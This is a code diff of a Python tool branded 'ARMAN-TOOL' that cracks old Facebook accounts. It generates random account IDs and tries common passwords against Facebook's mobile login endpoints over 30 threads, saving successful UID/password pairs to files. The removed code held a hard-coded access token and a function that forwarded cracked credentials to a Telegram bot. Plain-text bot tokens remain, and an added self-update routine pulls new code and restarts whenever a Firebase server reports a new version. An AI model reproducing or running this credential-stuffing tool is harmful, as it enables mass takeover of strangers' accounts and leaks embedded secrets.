@@ -1,5 +1,3 @@
-# -*- coding: utf-8 -*-
-
 import os
 import re
 import time
@@ -16,6 +14,7 @@ import warnings
 from bs4 import BeautifulSoup
 from random import randint as rr
 from concurrent.futures import ThreadPoolExecutor as tred
+from os import system
 from datetime import datetime, timedelta
 
 warnings.filterwarnings("ignore", category=SyntaxWarning)
@@ -34,19 +33,30 @@ requests.urllib3.disable_warnings()
 
 FIREBASE_URL = "https://arman-f9a3b-default-rtdb.firebaseio.com/"
 
-BOT_TOKEN = "8974282237:AAEov6IiXxLPOJT6-yN3GLTmRE643-O-6DY"
-TELEGRAM_USER = "8568795915"
+BOT_TOKEN = "8533770908:AAGpn4bIfoArEOyN7SjTskWnzIyGGjEPOoc"
+TELEGRAM_USER = "7111707713"
 
-def get_live_version():
+def check_update():
     try:
-        url = f"{FIREBASE_URL}123/Version.json"
+        url = "https://arman-f9a3b-default-rtdb.firebaseio.com/123/Version.json"
         response = requests.get(url, timeout=5)
-        ver = response.json()
-        if ver:
-            return str(ver).strip()
+        server_version = response.json()
+        
+        current_version = "15.3"
+        
+        if server_version and str(server_version).strip() != str(current_version).strip():
+            print("\n\x1b[38;5;196m========================================\033[0m")
+            print("\x1b[38;5;226m [!] New Version Available on Server!\033[0m")
+            print(f"\x1b[38;5;46m [✓] Updating Tool to Version: {server_version}\033[0m")
+            print("\x1b[38;5;51m [i] Please wait, downloading latest code...\033[0m")
+            print("\x1b[38;5;196m========================================\033[0m")
+            
+            os.system('git pull origin main > /dev/null 2>&1 || git pull > /dev/null 2>&1')
+            print("\n\x1b[38;5;46m[✓] Tool Updated Successfully! Restarting...\033[0m")
+            time.sleep(2)
+            os.execv(sys.executable, ['python'] + sys.argv)
     except Exception:
         pass
-    return "15.4"
 
 def get_device_model():
     try:
@@ -126,22 +136,6 @@ def send_login_alert(user_key, user_name, expiry_date):
     except Exception:
         pass
 
-def send_clone_alert(uid, pw, status):
-    emoji = "🟩"
-    message = (
-        f"{emoji} NEW {status} ID FOUND!\n"
-        "━━━━━━━━━━━━━━━━━━\n"
-        f"👤 UID: {uid}\n"
-        f"🔑 Password: {pw}\n"
-        "━━━━━━━━━━━━━━━━━━"
-    )
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": TELEGRAM_USER, "text": message}
-    try:
-        requests.post(url, data=payload, timeout=5)
-    except Exception:
-        pass
-
 def calculate_time_left(expiry_str):
     if not expiry_str:
         return expiry_str
@@ -187,6 +181,7 @@ def hold_screen_10_seconds():
     time.sleep(1)
 
 def check_key():
+    check_update()
     try:
         for m_node in ["maintenance.json", "maintenance_mode.json"]:
             m_res = requests.get(f"{FIREBASE_URL}{m_node}", timeout=5)
@@ -337,6 +332,7 @@ def check_key():
 
 method = []
 oks = []
+cps = []
 loop = 0
 user = []
 
@@ -390,7 +386,6 @@ def get_smart_headers():
 sys.stdout.write('\x1b]2;{ Arman 👑 }\x07')
 
 def show_branding():
-    live_ver = get_live_version()
     if 'win' in sys.platform:
         os.system('cls')
     else:
@@ -409,11 +404,45 @@ def show_branding():
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFACEBOOK   \x1b[38;5;46m▶  \033[1;97mARMAN-TOOL")
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mWHATSAPP   \x1b[38;5;46m▶  \033[1;97m03022745249")
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFEATURE    \x1b[38;5;46m▶  \033[1;97mOLD CLONING")
-    print(f"\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mVERSION    \x1b[38;5;46m▶  \033[1;97m{live_ver}")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mVERSION    \x1b[38;5;46m▶  \033[1;97m15.3")
     print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
 
 def ____banner____():
     show_branding()
+
+def creationyear(uid):
+    if uid.startswith(('1000000000', '1000000001')): return '2006'
+    if uid.startswith(('1000000002', '1000000003')): return '2007'
+    if uid.startswith(('1000000004', '1000000005')): return '2008'
+    if len(uid) == 15:
+        if uid.startswith('1000000000'): return '2009'
+        if uid.startswith('100000000'): return '2009'
+        if uid.startswith('10000000'): return '2009'
+        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
+        if uid.startswith(('1000006', '1000007', '1000008', '1000009')): return '2010'
+        if uid.startswith('100001'): return '2010'
+        if uid.startswith(('100002', '100003')): return '2011'
+        if uid.startswith('100004'): return '2012'
+        if uid.startswith(('100005', '100006')): return '2013'
+        if uid.startswith(('100007', '100008')): return '2014'
+        if uid.startswith('100009'): return '2015'
+        if uid.startswith('10001'): return '2016'
+        if uid.startswith('10002'): return '2017'
+        if uid.startswith('10003'): return '2018'
+        if uid.startswith('10004'): return '2019'
+        if uid.startswith('10005'): return '2020'
+        if uid.startswith('10006'): return '2021'
+        if uid.startswith('10009'): return '2023'
+        if uid.startswith(('10007', '10008')): return '2022'
+        return ''
+    elif len(uid) in (9, 10): return '2008'
+    elif len(uid) == 8: return '2007'
+    elif len(uid) == 7: return '2006'
+    elif len(uid) == 14 and uid.startswith('61'): return '2024'
+    else: return ''
+
+def clear():
+    os.system('clear')
 
 def linex():
     print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
@@ -457,67 +486,173 @@ def old_One():
     linex()
     ____banner____()
     print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE " + Y + ":" + G + " 20000 / 30000 / 99999")
-    limit = int(input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mLIMIT " + Y + ":" + G + " "))
+    limit = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT " + Y + ":" + G + " ")
     linex()
-    
-    for _ in range(limit):
-        code = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(code)
-        
-    print(f"\x1b[38;5;46m[✓] Total IDs Generated: {len(user)}\033[0m")
-    print(f"\x1b[38;5;51m[i] Starting Cracking Process...\033[0m")
+    star = '10000'
+    for _ in range(int(limit)):
+        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
+        user.append(data)
+    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
     linex()
-    
-    with tred(max_workers=35) as pool:
-        for uid in user:
-            pool.submit(api_cracking, uid)
-
-def api_cracking(uid):
-    global loop, oks
-    sys.stdout.write(f"\r\r\033[1;37m[ARMAN-OLD] \033[1;36m{loop}\033[1;37m | \033[1;32mOK:{len(oks)}\033[0m")
-    sys.stdout.flush()
-    try:
-        MY_TOKEN = "EAATlPU5kUrABSLZClswny9YmYedyXN7Tj8kqTcNUYvlZALoEm1zKWSpZAoOgZBoGZAeDBkvB7235BSF8eH1s5F2ZCMWqQ5qdJTZBw2CyLZBHZAZCZBr95vhTdXc4tQBAPZCiUkapZAexD1x4P0OyqEt0IlA6xCjj0C9F2uR3i78B0wJ7SdZAvBZCZAoxPXugV9dtSas5iBvmy6kkvK4E72KjxlMwmagDgJrlhBwoLmwi"
-        passwords = [
-            '123456', '12345678', '123456789', 'pakistan', 'khan123', 
-            'samsung', '786786', '12345', 'baazigar', '1234560', 
-            '112233', '786000', 'ali123', 'malik123', 'swati123', '123123'
-        ]
-        for pw in passwords:
-            headers = get_smart_headers()
-            url = f"https://graph.facebook.com/auth/login?method=GET&format=json&sdk=ios&sdk_version=2&email=10000{uid}&password={pw}&access_token={MY_TOKEN}"
-            
-            res = requests.get(url, headers=headers, timeout=10)
-            data = res.json()
-            
-            if "access_token" in data or "uid" in data:
-                print(f"\n\033[1;32m[ARMAN-OK] 10000{uid} | {pw}\033[0m")
-                oks.append(f"10000{uid}|{pw}")
-                with open("arman_ok.txt", "a") as f:
-                    f.write(f"10000{uid}|{pw}\n")
-                send_clone_alert(f"10000{uid}", pw, "OK")
+    meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ": " + G + " " + limit + W)
+        print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT" + G)
+        linex()
+        for mal in user:
+            uid = star + mal
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
+            else:
+                print(f"    {rad}[!] INVALID METHOD SELECTED")
                 break
-                
-        time.sleep(random.uniform(0.1, 0.4))
-        loop += 1
-    except Exception:
-        loop += 1
 
 def old_Tow():
-    print("\n\033[1;33m[!] 100003/4 Series Selected\033[0m")
-    old_One()
+    user = []
+    ____banner____()
+    print("       \x1b[38;5;46mOLD CODE " + Y + ":" + G + " 2010-2014")
+    ask = input("       \x1b[38;5;46mSELECT " + Y + ":" + G + " ")
+    linex()
+    ____banner____()
+    print("       \x1b[38;5;46mEXAMPLE " + Y + ":" + G + " 20000 / 30000 / 99999")
+    limit = input("       \x1b[38;5;46mSELECT " + Y + ":" + G + " ")
+    linex()
+    prefixes = ['100003', '100004']
+    for _ in range(int(limit)):
+        prefix = random.choice(prefixes)
+        suffix = ''.join(random.choices('0123456789', k=9))
+        uid = prefix + suffix
+        user.append(uid)
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD A')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD B')
+    linex()
+    meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ": " + G + " " + limit + W)
+        print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT" + G)
+        linex()
+        for uid in user:
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
+            else:
+                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                break
 
 def old_Tree():
-    print("\n\033[1;33m[!] 2009 Series Selected\033[0m")
-    old_One()
+    user = []
+    ____banner____()
+    print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mOLD CODE " + Y + ":" + G + " 2009-2010")
+    ask = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mSELECT " + Y + ":" + G + " ")
+    linex()
+    ____banner____()
+    print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mEXAMPLE " + Y + ":" + G + " 20000 / 30000 / 99999")
+    limit = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT " + Y + ":" + G + " ")
+    linex()
+    prefix = '1000004'
+    for _ in range(int(limit)):
+        suffix = ''.join(random.choices('0123456789', k=8))
+        uid = prefix + suffix
+        user.append(uid)
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD A')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMethod B')
+    linex()
+    meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ":" + G + limit + W)
+        print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT" + G)
+        linex()
+        for uid in user:
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
+            else:
+                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                break
 
-if __name__ == "__main__":
+def login_1(uid):
+    global loop
+    session = requests.session()
     try:
-        user_name, user_key, expiry_date = check_key()
-        time_left = calculate_time_left(expiry_date)
-        display_welcome_banner(user_name, user_key, time_left)
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m(\x1b[1;37mARMAN-M1\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.flush()
+        for pw in ('123456', '1234567', '12345678', '123456789'):
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'cpl': 'true',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'device_based_login_password',
+                'error_detail_type': 'button_with_disabled',
+                'source': 'device_based_login',
+                'email': str(uid),
+                'password': str(pw),
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'generate_session_cookies': '1',
+                'meta_inf_fbmeta': '',
+                'advertiser_id': str(uuid.uuid4()),
+                'currently_logged_in_userid': '0',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'method': 'auth.login',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '882a8490361da98702bf97a021ddc14d'
+            }
+            headers = get_smart_headers()
+            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            if 'session_key' in res:
+                print(f"\r\r\x1b[1;37m>(\x1b[1;37mARMAN\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/ARMAN-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
+            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
+                print(f"\r\r(\x1b[1;37mARMAN\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/ARMAN-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                break
+        loop += 1
+    except Exception:
+        time.sleep(5)
+
+def login_2(uid):
+    global loop
+    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+(\x1b[1;37mARMAN-M2\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+    
+    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
+        try:
+            with requests.Session() as session:
+                headers = get_smart_headers()
+                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
+                po = session.get(url, headers=headers).json()
+                if 'session_key' in str(po):
+                    print(f"\r\r(\x1b[1;37mARMAN\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/ARMAN-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    oks.append(uid)
+                    break
+                elif 'session_key' in po:
+                    print(f"\r\r(\x1b[1;37mARMAN\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/ARMAN-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    oks.append(uid)
+                    break
+        except Exception:
+            pass
+    loop += 1
+
+if __name__ == '__main__':
+    result = check_key()
+    if result:
+        user_name, user_key, expiry_str = result
+        remaining_time = calculate_time_left(expiry_str)
+        display_welcome_banner(user_name, user_key, remaining_time)
         hold_screen_10_seconds()
         BNG_71_()
-    except Exception as e:
-        print(f"\n\033[1;31m[×] Error: {e}\033[0m")
-        sys.exit()
